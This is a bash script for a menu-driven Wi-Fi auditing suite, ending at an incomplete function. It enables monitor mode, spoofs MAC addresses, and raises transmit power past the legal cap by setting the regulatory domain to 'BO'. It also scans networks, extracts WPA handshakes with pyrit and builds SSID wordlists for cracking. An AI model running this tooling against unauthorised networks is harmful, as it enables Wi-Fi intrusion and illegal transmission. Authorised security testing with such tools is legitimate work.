#!/bin/bash
#THS Wireless Suite
#thsuite.sh v0.2
#By TAPE
#Last edit 18-08-2013 16:30
#Written on THS-OS v3 (CR4CK3RB0X) and Kali Linux
#Tested on both with some options performing better on Kali
#Source: http://thsuite.googlecode.com/svn/thsuite.sh
#
##
### FIXED SETTINGS
##################
VERS=$(sed -n 3p $0 | awk '{print $2}')	#Version information 
LED=$(sed -n 5p $0 | awk '{print $3 " - " $4}') #Date of last edit to script
STD=$(echo -e "\e[0;0;0m")		#Revert fonts to standard colour/format
RED=$(echo -e "\e[1;31m")		#Alter fonts to red bold
REDN=$(echo -e "\e[0;31m")		#Alter fonts to red normal
GRN=$(echo -e "\e[1;32m")		#Alter fonts to green bold
GRNN=$(echo -e "\e[0;32m")		#Alter fonts to green normal
BLU=$(echo -e "\e[1;36m")		#Alter fonts to blue bold
BLUN=$(echo -e "\e[0;36m")		#Alter fonts to blue normal
#
##
### VARIABLES
#############
if [ ! -e /root/THS_TMP/ ] ; then mkdir /root/THS_TMP/ ; fi
THSDIR="/root/THS_TMP/"
SAVEDIR="/root/"
#
##
### EXITING SCRIPT
##################
trap f_ctrl_c INT
#
f_exit() {
f_clean
echo $STD""
exit 0
}
#
f_ctrl_c() {
f_exit
exit 0
}
#
##
### HEADER
##########
f_header() {
echo $BLU" _____ _  _ ___      _ _       
|_   _| || / __|_  _(_) |_ ___ 
  | | | ~~ \__ \ || | |  _/ -_)
  |_| |_||_|___/\_,_|_|\__\___|$STD"
}
#
##
### VERSION
###########
f_vers() {
clear
f_header
echo $STD"  By TAPE"
echo $STD
echo $STD"THSuite $GRN$VERS$STD Last edit $GRN$LED$STD

Written for the THS crew at www.top-hat-sec.com
Enjoy Guyz & Galz ;)" 
f_exit
}
#
##
### MAKE SURE NO TEMP FILES REMAINING BEFORE START FUNCTION
###########################################################
f_clean() { 
rm -rf /root/THS_TMP/handshake_list.tmp
rm -rf /root/THS_TMP/pyrit_cap_analyze.tmp
rm -rf /root/THS_TMP/csvfile_ap.tmp
rm -rf /root/THS_TMP/csvfile_cl.tmp
rm -rf /root/THS_TMP/wpa_temp*
rm -rf /root/THS_TMP/scan_temp*
rm -rf /root/THS_TMP/scan_assist.tmp
rm -rf /root/THS_TMP/ssid_list.tmp
rm -rf /root/THS_TMP/trash.tmp
rm -rf "$THSDIR"blacklist.tmp
rm -rf "$THSDIR"whitelist.tmp
rm -rf /root/THS_TMP/handshake_list_full.tmp
} 
#
##
### IFACE EXIST CHECK
#####################
f_exist() {
EXIST=$(airmon-ng | sed "0,/Interface/d")
if [ "$EXIST" == "" ] ; then
echo $RED">$STD No wireless interfaces found"$STD
sleep 1.5 
f_menu
fi
} 
#
##
### MON IFACE EXIST CHECK
#########################
f_mon_check() {
if ! airmon-ng | sed "0,/Interface/d" | cut -f 1 | grep -Fq mon
then MONCHECK=0
else MONCHECK=1
fi
if [ $MONCHECK -eq 0 ] ; then 
echo $RED">$STD No monitor interface detected"$STD
sleep 0.5
echo $RED">$STD Monitor interface required"$STD
sleep 1
f_menu
fi
}
#
##
### LIST INTERFACES WITH MAC / MODE / STATUS / TX
#################################################
f_iface_stat() {
echo -e $BLUN"INTERFACE\tMAC ADDRESS\t\tMODE\tSTATUS\tTX POWER"
echo -e $STD"---------\t-----------\t\t----\t------\t--------"
for i in $(airmon-ng | sed "0,/Interface/d" | cut -f 1)
do
IFACE=$i
if [[ "$i" =~ "wlan" ]] ; then
MODE=$(iwconfig $i | grep -i Mode | awk -F " " '{print $1}' | sed 's/Mode://')
MAC=$(ifconfig $i | grep $i | awk '{print $5}')
TX=$(iwconfig $i | sed 1d | grep -o "Tx-Power=.*" | sed 's/Tx-Power=//')
elif [[ "$i" =~ "mon" ]] ; then
MODE=$(iwconfig $i | grep Mode | awk -F " " '{print $4}' | sed 's/Mode://')
MAC=$(ifconfig $i | grep $i | awk '{print $5}' | cut -d - -f 1,2,3,4,5,6 | sed 's/-/:/g')
TX=$(iwconfig $i | grep -o "Tx-Power=.*" | sed 's/Tx-Power=//')
fi
if ! ifconfig $i | sed '1d' | grep -iq UP ; then STATUS=" DOWN" ; else STATUS="  UP" ; fi
echo -e $GRN"$IFACE\t\t$MAC\t$MODE\t$STATUS\t$TX"
done
}
#------------------------#	
# MENU ITEM 1			 #
# INTERFACE MANIPULATION #
##########################
#
# This function makes use of the programs 'airmon-ng', 'ifconfig', 'iw' & 'iwconfig' to alter the settings of your interface(s).
f_iface() {
clear
f_header
echo $BLU">$STD Wireless Interface manipulation"
echo $STD""
echo $STD"Available interface(s) $GRN"
f_exist
f_iface_stat
echo $BLU"
OPTIONS $STD
1  Create monitor interface
2  Stop all monitor interfaces
3  Put all interfaces 'down'
4  View/Alter TX power settings
5  Attempt to restart networking services
Q  Back to main menu
$STD"
echo -ne "Enter choice from above menu: $GRN"
read IFACE_MENU
	if [ "$IFACE_MENU" == "q" ] || [ "$IFACE_MENU" == "Q" ] ; then 
	echo $STD""
	f_menu
	elif [ "$IFACE_MENU" == "" ] ; then f_menu
	elif [[ "$IFACE_MENU" != [1-5] ]]; then
	echo $RED">$STD Input error $RED[$STD$IFACE_MENU$RED]$STD must be an entry from the above menu$STD"
	sleep 1
	f_iface
	fi
#
# Option 1 
# Setting Monitor mode on interface
# ---------------------------------
if [ "$IFACE_MENU" == "1" ] ; then
clear
f_header 
echo $BLU">$STD Create Monitor interface"
echo $STD""
echo $STD"Available interface(s)"
f_iface_stat
echo $STD""
echo -ne $GRN">$STD Enter interface to create a monitor interface on: $GRN"
read IFACE
if [ "$IFACE" == "" ] ; then f_iface ; fi
while ! airmon-ng | sed "0,/Interface/d" | cut -f 1 | grep -Fxq $IFACE
do echo $RED">$STD Interface error $RED[$STD$IFACE$RED]$STD Interface does not exist."
echo -ne $GRN">$STD Enter interface to create a monitor interface on: $GRN"
read IFACE
if [ "$IFACE" == "" ] ; then f_iface ; fi
done
if [[ "$IFACE" =~ "wlan" ]] ; then
MODE=$(iwconfig $IFACE | grep -i Mode | awk -F " " '{print $1}' | sed 's/Mode://')
elif [[ "$IFACE" =~ "mon" ]] ; then
MODE=$(iwconfig $IFACE | grep Mode | awk -F " " '{print $4}' | sed 's/Mode://')
fi
if [ "$MODE" == "Monitor" ] ; then
echo $RED">$STD Interface selected already in monitor mode"
sleep 2
f_iface
fi
echo -ne $GRN">$STD Kill processes that may affect performance (airmon-ng check kill) y/N $GRN"
read CHECKKILL
if [[ "$CHECKKILL" == "y" || "$CHECKKILL" == "Y" ]] ; then 
xterm -geometry 96x15-0+0 -e airmon-ng check kill
fi
echo $GRN">$STD Creating monitor interface on $GRN$IFACE$STD"
xterm -geometry 96x15-0+0 -e airmon-ng start $IFACE
echo $GRN">$STD Monitor interface created"
sleep 1
f_iface
#
# Option 2
# Stopping all monitor interfaces
# -------------------------------
elif [ "$IFACE_MENU" == "2" ] ; then 
echo $BLU">$STD Stopping monitor interface(s)"
for i in $(airmon-ng | sed "0,/Interface/d" | cut -f 1) ; do
	if [[ "$i" =~ "mon" ]] ; then
	xterm -geometry 96x15-0+0 -e airmon-ng stop $i
	fi
done
echo $GRN">$STD All monitor interfaces stopped"
f_iface
#
# Option 3
# Putting all interfaces down
# ---------------------------
elif [ "$IFACE_MENU" == "3" ] ; then 
echo $BLU">$STD Putting interface(s) down"
for i in $(airmon-ng | sed "0,/Interface/d" | cut -f 1) ; do
	xterm -geometry 96x15-0+0 -e ifconfig $i down
done
echo $GRN">$STD All interfaces now down"
sleep 1.5
f_iface
#
# Option 4
# Alter TX power settings
# ------------------------
elif [ "$IFACE_MENU" == "4" ] ; then 
clear
f_header
echo $BLU">$STD View/Alter TX power settings"
echo $STD""
echo $RED"! Depending on your wireless card, changing power settings may or may not work !
        Setting to lower power should be possible, higher not always."$STD
COUN=$(iw reg get | sed -n '1p' | cut -c 9,10)
MPOW=$(iw reg get | sed -n '2p' | cut -d , -f 3 | sed -e 's/^ *//' -e 's/.$//')
echo $STD""
echo -e $BLUN"INTERFACE     MAC ADDRESS        MODE     STATUS   TX POWER   Chipset / Driver"
echo -e $STD"---------  -----------------    ------    ------   --------   ----------------"
for i in $(airmon-ng | sed "0,/Interface/d" | cut -f 1)
do
IFACE=$i
if [[ "$i" =~ "wlan" ]] ; then
MODE=$(iwconfig $i | grep -i Mode | awk -F " " '{print $1}' | sed 's/Mode://')
MAC=$(ifconfig $i | grep $i | awk '{print $5}')
TX=$(iwconfig $i | sed 1d | grep -o "Tx-Power=.*" | sed 's/Tx-Power=//')
CHIPDRIV=$(airmon-ng | grep $i | sed -e "s/$i//" | sed -e 's/^[ \t]*//' -e 's/.\{9\}$//')
elif [[ "$i" =~ "mon" ]] ; then
MODE=$(iwconfig $i | grep Mode | awk -F " " '{print $4}' | sed 's/Mode://')
MAC=$(ifconfig $i | grep $i | awk '{print $5}' | cut -d - -f 1,2,3,4,5,6 | sed 's/-/:/g')
TX=$(iwconfig $i | grep -o "Tx-Power=.*" | sed 's/Tx-Power=//')
CHIPDRIV=$(airmon-ng | grep $i | sed -e "s/$i//" | sed -e 's/^[ \t]*//' -e 's/.\{9\}$//')
fi
if ! ifconfig $i | sed '1d' | grep -iq UP ; then STATUS=" DOWN" ; else STATUS="  UP" ; fi
echo -n $GRN
printf '%-10s %-20s %-9s %-9s %-9s %-15s\n' "$i" "$MAC" "$MODE" "$STATUS" "$TX" "$CHIPDRIV"
done
echo $STD""
echo $STD"Current country setting --> $GRN$COUN$STD"
echo $STD"Country max TX power at --> $GRN$MPOW$STD"
echo $STD""
echo -ne $GRN">$STD Edit settings ? y/N $GRN"
read EDITSET
if [[ "$EDITSET" == "y" || "$EDITSET" == "Y" ]] ; then
echo $STD""
echo -ne $GRN">$STD Enter new country setting: $GRN"
read COUNED
while [[ ! "$COUNED" =~ ^[A-Z]{2}$ && "$COUNED" != "00" ]] ; do 
	if [ "$COUNED" == "" ] ; then COUNED=$(iw reg get | sed -n '1p' | cut -c 9,10) ; else
	echo $RED">$STD Input error $RED[$STD$COUNED$RED]$STD 2-letter Country code required."
	echo -ne $GRN">$STD Enter 2-letter ISO3166 alpha-2 code: $GRN"
	read COUNED
	fi
done
	iw reg set $COUNED
echo -ne $GRN">$STD Enter interface to alter power setting on: $GRN"
read IFACE
if [ "$IFACE" == "" ] ; then f_iface ; else
	while ! airmon-ng | sed "0,/Interface/d" | cut -f 1 | grep -Fxq $IFACE ; do
	echo $RED">$STD Interface error $RED[$STD$IFACE$RED]$STD Interface does not exist."
	echo -ne $GRN">$STD Enter interface to alter power setting on: $GRN"
	read IFACE
	if [ "$IFACE" == "" ] ; then f_iface ; fi
	done
fi
	echo -ne $GRN">$STD Enter desired power setting: $GRN"
	read PSET
while [[ ! "$PSET" =~ ^[0-9]{2}$ || (($PSET > 30)) ]] ; do 
	if [ "$PSET" == "" ] ; then f_iface
	elif (($PSET > 30)) ; then
	echo $RED">$STD Input error $RED[$STD$PSET$RED]$STD Too high, max 30"
	echo -ne $GRN">$STD Enter desired power setting: $GRN"
	read PSET
	else
	echo $RED">$STD Input error $RED[$STD$PSET$RED]$STD 2-digit number required."
	echo -ne $GRN">$STD Enter desired power setting: $GRN"
	read PSET
	fi
done
	if (($PSET<=$MPOW)) ; then 
	echo $GRN">$STD Working..$RED"
	iwconfig $IFACE txpower $PSET
	sleep 1
	f_iface
	elif (($PSET>$MPOW)) ; then
	echo $GRN">$STD Working..$RED"
	ifconfig $IFACE down
	iw reg set BO
	sleep 1
	iwconfig $IFACE txpower $PSET
	sleep 1
	ifconfig $IFACE up
	f_iface
	fi
fi
f_iface
#
# Option 5
# Restart network services
# ------------------------
elif [ "$IFACE_MENU" == "5" ] ; then 
echo $STD"
If you chose to kill processes that may affect performance during monitor
interface creation, this will have killed your networking services."
echo $STD
echo -n $GRN">$STD Attempt to restart networking processes / services? y/N $GRN"
read RESTART
	if [[ "$RESTART" == "y" || "$RESTART" == "Y" ]] ; then
	echo $GRN">$STD Here we go.."
	/etc/init.d/networking start
	sleep 1.5
	service network-manager start
	sleep 1.5
	NetworkManager
	sleep 1
fi
f_iface
#
fi
}
#-------------------#	
# MENU ITEM 2		#
# MAC MANIPULATION	#
#####################
#
# This functions makes use of the program 'macchanger' to alter or reset your interface's MAC address.
f_mac() {
clear
f_header
echo $BLU">$STD MAC address manipulation"$STD
echo $STD""
echo $STD"Available interface(s)"$GRN
f_exist
f_iface_stat
echo $STD""
echo $BLUN"Hit Enter to return to previous menu"
echo -ne $GRN">$STD Enter interface to change MAC on: $GRN"
read IFACE
if [ "$IFACE" == "" ] ; then f_menu ; fi
while ! airmon-ng | sed "0,/Interface/d" | cut -f 1 | grep -Fxq $IFACE
do echo $RED">$STD Interface error $RED[$STD$IFACE$RED]$STD Interface does not exist."
echo -ne $GRN">$STD Enter interface to change MAC on: $GRN"
read IFACE
if [ "$IFACE" == "" ] ; then f_menu ; fi
done
echo $BLU"
OPTIONS $STD
1  Set random MAC address
2  Set specific MAC address
3  Reset to original permanent MAC address
Q  Back to main menu
"
echo -ne "Enter choice from above menu: "$GRN
read MAC_MENU
	if [ "$MAC_MENU" == "q" ] || [ "$MAC_MENU" == "Q" ] ; then 
	echo $STD""
	f_menu
	elif [ "$MAC_MENU" == "" ] ; then f_menu
	elif [[ "$MAC_MENU" != [1-3] ]]; then
	echo $RED">$STD Input error $RED[$STD$MAC_MENU$RED]$STD must be an entry from the above menu"$STD 
	sleep 1
	f_mac
	fi
#
# Option 1 
# Setting Random mac address
# --------------------------
if [ "$MAC_MENU" == "1" ] ; then 
echo $BLU">$STD Setting random MAC on $GRN$IFACE$STD"
sleep 1
echo $GRN">$STD Putting interface $GRN$IFACE$STD down"
ifconfig $IFACE down
echo $GRN">$STD Running macchanger with setting -A"
macchanger -A $IFACE
echo $GRN">$STD Putting interface $GRN$IFACE$STD up"
ifconfig $IFACE up
sleep 1
f_menu
#
# Option 2 
# Setting Specific mac address
# ----------------------------
elif [ "$MAC_MENU" == "2" ] ; then 
echo $BLU">$STD Set specific MAC on $GRN$IFACE$STD"
echo -ne $GRN">$STD Enter MAC address to use: $GRN"
read MACCH
while [[ ! "$MACCH" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ && ! "$MACCH" =~ ^[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}$ ]]
do echo $RED">$STD Input error $RED[$STD$MACCH$RED]$STD Incorrect MAC syntax."
echo -ne $GRN">$STD Enter MAC address to use: "
read MACCH
done
	if [[ "$MACCH" =~ ^[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}-[0-9a-fA-F]{2}$ ]] ; then
	MACCH=$(echo "$MACCH" | sed 's/-/:/g')
	fi
echo $GRN"> $STD Putting interface $GRN$IFACE$STD down"
ifconfig $IFACE down
echo $GRN"> $STD Running macchanger with setting -m"
macchanger -m $MACCH $IFACE
echo $GRN"> $STD Putting interface $GRN$IFACE$STD up"
ifconfig $IFACE up
sleep 1
f_menu
#
# Option 3 
# Resetting permanent mac address
# -------------------------------
elif [ "$MAC_MENU" == "3" ] ; then 
echo $BLU">$STD Resetting original MAC of $GRN$IFACE$STD"
sleep 1
echo $GRN">$STD Putting interface $GRN$IFACE$STD down"
ifconfig $IFACE down
echo $GRN">$STD Resetting the permanent MAC of interface $GRN$IFACE$STD"
macchanger -p $IFACE
echo $GRN">$STD Putting interface $GRN$IFACE$STD up"
ifconfig $IFACE up
sleep 1
f_menu
#
fi
}
#
##
### WIRELESS SCANNING
#####################
#
# This function uses airodump-ng to scan for networks.
f_wireless_scan() {
if [ ! -d "/root/THS_TMP/" ] 
then mkdir /root/THS_TMP/
fi
clear
f_header
echo $BLU">$STD Wireless scanning"
echo $STD""
echo $STD"Available interface(s)"
f_exist
f_mon_check
f_iface_stat
echo $STD""
#
echo -ne $GRN">$STD Enter monitor interface to scan with: $GRN"
read IFACE
if [ "$IFACE" == "" ] ; then f_menu ; fi
while ! airmon-ng | sed "0,/Interface/d" | cut -f 1 | grep -Fxq $IFACE ; do
echo $RED">$STD Interface error $RED[$STD$IFACE$RED]$STD Interface does not exist."
echo -ne $GRN">$STD Enter monitor interface to scan with: $GRN"
read IFACE
if [ "$IFACE" == "" ] ; then f_menu ; fi
done
if [[ ! "$IFACE" =~ "mon" ]] ; then
	echo $RED"> [$STD$IFACE$RED]$STD is not a monitor interface"
	sleep 1.5
	f_wireless_scan
fi 
#
echo $BLUN"Optional Input (hit Enter for default)$STD"
echo  -ne $GRN">$STD Enter channel to scan on (default: all channels): $GRN"
read CHAN
	if [[ "$CHAN" == "" || "$CHAN" == *,* ]] ; then 
	echo -ne $GRN">$STD Enter channel hop frequency in seconds: $GRN"
	read HOP
		if [ "$HOP" != "" ] ; then HOP=$(( $HOP * 1000 )) ; fi
	fi
echo -ne $GRN">$STD Enter scan time (default: no limit): $GRN"
read SCAN
FILEOUT=$(date +"%Y%m%d-%H%M")
if [[ "$CHAN" != "" && "$SCAN" != "" ]] ; then
timeout $SCAN xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -c $CHAN -w /root/THS_TMP/$FILEOUT
elif [[ "$CHAN" != "" && "$SCAN" == "" ]] ; then
echo $STD"Ctrl-C on xterm window to stop scan"
xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -c $CHAN -w /root/THS_TMP/$FILEOUT
elif [[ "$CHAN" == "" && "$SCAN" == "" && "$HOP" == "" ]] ; then
echo $STD"Ctrl-C on xterm window to stop scan"
xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -w /root/THS_TMP/$FILEOUT
elif [[ "$CHAN" == "" && "$SCAN" != "" && "$HOP" == "" ]] ; then
timeout $SCAN xterm -T "Ctrl C to quit any time" -geometry 105x36-0+0 -e airodump-ng $IFACE -w /root/THS_TMP/$FILEOUT
elif [[ "$CHAN" == "" && "$SCAN" != "" && "$HOP" != "" ]] ; then
timeout $SCAN xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -f $HOP -w /root/THS_TMP/$FILEOUT
elif [[ "$CHAN" == "" && "$SCAN" == "" && "$HOP" != "" ]] ; then
echo $STD"Ctrl-C on xterm window to stop scan"
xterm -T "THSuite" -geometry 105x36-0+0 -e airodump-ng $IFACE -f $HOP -w /root/THS_TMP/$FILEOUT
fi
echo $STD
echo $GRN">$STD Scan completed"
sleep 1.5
f_menu
}
#
##
### LIST PREVIOUS WIRELESS SCANS
################################
f_list_wireless() {
clear
f_header
f_clean
echo $BLU">$STD THSuite scans/captures"
FILES=$(ls -A /root/THS_TMP/)
if [ "$FILES" == "" ] ; then 
echo -e $RED"\n >> No previous THSuite scans/captures found <<$STD"
sleep 1.5
f_menu
fi
echo $BLU"
OPTIONS$STD
1  View Access Points and clients/probes
2  Check scans for useable handshakes
3  Strip ESSIDs / Probes to wordlist
4  Remove previous scans/captures
Q  Back to main menu
"
echo -ne $STD"Enter choice from above menu: $GRN"
read LISTW
	if [ "$LISTW" == "q" ] || [ "$LISTW" == "Q" ] ; then 
	echo $STD""
	f_menu
	elif [ "$LISTW" == "" ] ; then f_menu
	elif [[ "$LISTW" != [1-4] ]]; then
	echo $RED">$STD Input error $RED[$STD$LISTW$RED]$STD must be an entry from the above menu"$STD 
	sleep 1
	f_list_wireless
	fi 
#
# Option 1
# View network info from captures
# -------------------------------
if [ "$LISTW" == "1" ] ; then
clear
f_header
echo $BLU">$STD View APs and Clients/Probes info from scan$STD"
echo $STD""
echo $STD"Found THSuite scans;$GRNN"
ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed '/./=' | sed '/./N;s/\n/ /'
echo $STD""
MAXNR=$(ls -l /root/THS_TMP/*.csv | grep -v kismet.csv | wc -l)
echo -ne $GRN">$STD Choose file # from list to view network info: $GRN"
read LISTNR
if [ "$LISTNR" == "" ] ; then f_list_wireless ; fi
	while [[ ! "$LISTNR" =~ ^[1-$MAXNR]$ ]] ; do
	echo $RED">$STD Input error $RED[$STD$LISTNR$RED]$TD Entry not in list"
	echo -ne $GRN">$STD Choose file # from list to view network info: "
	read LISTNR
	if [ "$LISTNR" == "" ] ; then f_list_wireless ; fi
	done
	FILEIN=$(ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed -n "$LISTNR p")
f_parse_csv
#
# Option 2
# Check scans for 4-way handshakes
# -----------------------------------
elif [ "$LISTW" == "2" ] ; then 
clear
f_header
echo $BLU">$STD Check THSuite scans for handshakes"
echo $STD""
echo $STD"Found THSuite scans;$GRNN"
ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed '/./=' | sed '/./N;s/\n/ /'
echo $STD""
MAXNR=$(ls -l /root/THS_TMP/*.csv | grep -v kismet.csv | wc -l)
echo -ne $GRN">$STD Choose # from list to check associated capture for handshake(s): $GRN"
read LISTNR
if [ "$LISTNR" == "" ] ; then f_list_wireless ; fi
	while [[ ! "$LISTNR" =~ ^[1-$MAXNR]$ ]] ; do
	echo $RED">$STD Input error $RED[$STD$LISTNR$RED]$TD Entry not in list"
	echo -ne $GRN">$STD Choose # from list to check associated capture for handshake(s): $GRN"
	read LISTNR
	if [ "$LISTNR" == "" ] ; then f_list_wireless ; fi
	done
#
CSVFILE=$(ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed -n "$LISTNR p")
CAPFILE=$(echo $CSVFILE | sed 's/.csv/.cap/')
HANDSHAKE=$CAPFILE
echo $STD
pyrit -r "$CAPFILE" analyze  > /root/THS_TMP/pyrit_cap_analyze.tmp
sed -i -e 's/^[ \t]*//' -e 's/ *$//' /root/THS_TMP/pyrit_cap_analyze.tmp
while read line ; do
HAND=$(echo $line | grep -i "handshake(s)")
if [ "$HAND" != "" ] ; then
echo $HAND >> /root/THS_TMP/handshake_list.tmp
fi
done < /root/THS_TMP/pyrit_cap_analyze.tmp
#
	if [ -e /root/THS_TMP/handshake_list.tmp ] ; then
	echo $GRN">$STD Handshakes found"
	echo $BLUN"      BSSID             CLIENT MAC        CHANNEL    ESSID"
	echo $STD"-----------------    -----------------    -------    -----"
	while read line ; do 
	TARGET_CL=$(echo $line | awk '{print $3}' | sed 's/.$//' | tr '[:lower:]' '[:upper:]')
	TARGET_AP=$(cat $CSVFILE | sed '0,/Station MAC/d' | grep $TARGET_CL | awk '{print $8}' | sed 's/.$//')
	TARGET_CHAN=$(cat $CSVFILE| sed '0,/BSSID/d;/Station MAC/,$d' | grep -a $TARGET_AP | cut -d , -f 4 | sed -e 's/^ *//' -e 's/ *$//')
	TARGET_SSID=$(cat $CSVFILE | sed '0,/BSSID/d;/Station MAC/,$d' | grep -a $TARGET_AP | awk -F , '{print $14}' | sed 's/[ ]//')
	printf '%-20s %-22s %-8s %-15s\n' "$TARGET_AP" "$TARGET_CL" "$TARGET_CHAN" "$TARGET_SSID" >> /root/THS_TMP/handshake_list_full.tmp
	done < /root/THS_TMP/handshake_list.tmp
	cat /root/THS_TMP/handshake_list_full.tmp
	else echo $RED">$STD No handshakes found" 
	sleep 1.5
	f_list_wireless
	fi
echo $STD""
echo -n $STD"Attempt to strip handshakes to individual files ? y/N $GRN"
read STRIP
if [[ "$STRIP" == "y" || "$STRIP" == "Y" ]] ; then
f_strip
else
#
f_clean
f_menu
fi
#
# Option 3
# Strip all ESSIDs and Probes to wordlist 
# ---------------------------------------
elif [ "$LISTW" == "3" ] ; then 
clear
f_header
echo $BLU">$STD Strip ESSIDs / Probes from THSuite scan(s) to wordlist $STD"
echo $STD
echo $STD"Found THSuite scans;$GRNN"
ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed '/./=' | sed '/./N;s/\n/ /'
echo $STD""
MAXNR=$(ls -l /root/THS_TMP/*.csv | grep -v kismet.csv | wc -l)
echo -ne $GRN">$STD Choose file # from list to strip info from [a for all]: $GRN"
read LISTNR
if [ "$LISTNR" == "" ] ; then f_list_wireless ; fi
	while [[ ! "$LISTNR" =~ ^[1-$MAXNR]$ ]] && [ "$LISTNR" != "a" ] ; do
	echo $RED">$STD Input error $RED[$STD$LISTNR$RED]$STD Entry not in list"
	echo -ne $GRN">$STD Choose file # from list to strip info from [a for all]: $GRN"
	read LISTNR
	if [ "$LISTNR" == "" ] ; then f_list_wireless ; fi
	done
#
if [ "$LISTNR" == "a" ] ; then
FILEDATE=$(date +"%Y%m%d-%H%M")
echo $GRN">$STD Stripping SSIDs and Probes from all scans"$STD
for i in $(ls -t /root/THS_TMP/*.csv | grep -v kismet.csv) ; do
cat $i | sed '0,/BSSID/d;/Station MAC/,$d' | sed '$d' > /root/THS_TMP/csvfile_ap.tmp
cat $i | sed -e '0,/Station MAC/d' -e '$d' > /root/THS_TMP/csvfile_cl.tmp
	while read line ; do 
	SSID=$(echo $line | awk -F , '{print $14}' | sed 's/[ ]//') 
	echo -e "\n$SSID" >> /root/THS_TMP/ssid_list.tmp
	done < /root/THS_TMP/csvfile_ap.tmp
	sed -i '/^$/d' /root/THS_TMP/ssid_list.tmp
	while read line ; do 
	SSID=$(echo $line | awk -F , '{print $7}' | sed 's/[ ]//') 
	echo -e "\n$SSID" >> /root/THS_TMP/ssid_list.tmp
	done < /root/THS_TMP/csvfile_cl.tmp
	sed -i '/^$/d' /root/THS_TMP/ssid_list.tmp
done
echo $GRN">$STD Sorting and removing duplicates"
cat /root/THS_TMP/ssid_list.tmp | sort | uniq > "$SAVEDIR"SSIDs"$FILEDATE".txt
FILENAME="$SAVEDIR"SSIDs"$FILEDATE".txt
sed -i '1d' $FILENAME
echo $GRN">$STD SSID wordlist $GRN$FILENAME$STD created"
else
#
#
FILEIN=$(ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed -n "$LISTNR p")
FILEBASE=$(echo $FILEIN | sed s'/\/root\/THS_TMP\///' | sed 's/.\{7\}$//')
cat $FILEIN | sed '0,/BSSID/d;/Station MAC/,$d' | sed '$d' > /root/THS_TMP/csvfile_ap.tmp
cat $FILEIN | sed -e '0,/Station MAC/d' -e '$d' > /root/THS_TMP/csvfile_cl.tmp
#
echo $GRN">$STD Stripping ESSID and Probe information from $GRN$FILEIN$STD"
while read line ; do 
SSID=$(echo $line | awk -F , '{print $14}' | sed 's/[ ]//') 
echo -e "\n$SSID" >> /root/THS_TMP/ssid_list.tmp
done < /root/THS_TMP/csvfile_ap.tmp
sed -i '/^$/d' /root/THS_TMP/ssid_list.tmp
while read line ; do 
SSID=$(echo $line | awk -F , '{print $7}' | sed 's/[ ]//') 
echo -e "\n$SSID" >> /root/THS_TMP/ssid_list.tmp
done < /root/THS_TMP/csvfile_cl.tmp
sed -i '/^$/d' /root/THS_TMP/ssid_list.tmp
#
echo $GRN">$STD Sorting and removing duplicates"
cat /root/THS_TMP/ssid_list.tmp | sort | uniq > "$SAVEDIR"SSIDs"$FILEBASE".txt
FILENAME="$SAVEDIR"SSIDs"$FILEBASE".txt
sed -i '1d' $FILENAME
echo $GRN">$STD SSID wordlist $GRN$FILENAME$STD created"
fi
echo -n $STD"
Hit Enter to continue "
read ENTER
if [ "$ENTER" == "q" ] || [ "$ENTER" == "Q" ] ; then f_menu ; fi
f_list_wireless
#
# Option 4
# Remove saved THSuite scans/captures
# -----------------------------------
elif [ "$LISTW" == "4" ] ; then 
clear
f_header
echo $BLU">$STD Remove saved THSuite scans/captures $STD"
echo $STD
#
echo $STD"THSuite scans/captures found; $GRNN"
ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed '/./=' | sed '/./N;s/\n/ /'
#
echo $STD
MAXNR=$(ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | wc -l)
echo $BLUN"Hit Enter to return to previous menu"$STD 
echo -n $GRN">$STD Choose file # from above list to remove [a for all]: $GRN"
read LISTF
	while [[ "$LISTF" != [1-$MAXNR] ]] && [[ "$LISTF" != "a" ]]; do 
	if [ "$LISTF" == "" ] ; then f_list_wireless ; fi
	echo $RED">$STD Input error $RED[$STD$LISTF$RED]$STD List number does not exist"$STD
	echo -n $GRN">$STD Choose file # from above list to remove [a for all]: $GRN"
	read LISTF
	done
	if [ "$LISTF" == "a" ] ; then
	echo $GRN">$STD Removing all THSuite scans/captures"
	for i in $(ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed 's/.\{4\}$//') ; do
	rm -rf "$i"*
	done
	echo -n $GRN">$STD All files removed, hit Enter to continue "
	read ENTER
	if [ "$ENTER" == "q" ] || [ "$ENTER" == "Q" ] ; then f_menu ; fi
	f_menu
	else
	REMFILE=$(ls -t /root/THS_TMP/*.csv | grep -v kismet.csv | sed 's/.\{4\}$//' | sed -n "$LISTF p")
	echo $GRN">$STD Removing $GRNN$REMFILE*$STD"
	rm -rf "$REMFILE"*
	echo $GRN">$STD $GRNN$REMFILE*$STD removed"
	echo -n $STD"hit Enter to continue "
	read
	f_menu
	fi
fi
}
#
##
### STRIP HANDSHAKES
####################
#
# This function uses pyrit to strip out handshakes found on each ESSID 
# stripped cap files are saved and named as per the ESSID name.
f_strip() {
clear
f_header
echo $BLU">$STD Stripping Handshakes with Pyrit"
echo $STD""
while read line ; do
echo $STD""
TARGET_SSID=$(echo $line | awk '{print $4}')
OUTFILE="$TARGET_SSID".cap
pyrit -e $TARGET_SSID -r $HANDSHAKE -o $SAVEDIR$OUTFILE strip
echo $BLU"Handshake strip for $GRN$TARGET_SSID$BLU complete.."
done < /root/THS_TMP/handshake_list_full.tmp
f_exit
}
#
##
### PARSE CSV 
#############
f_parse_csv() {
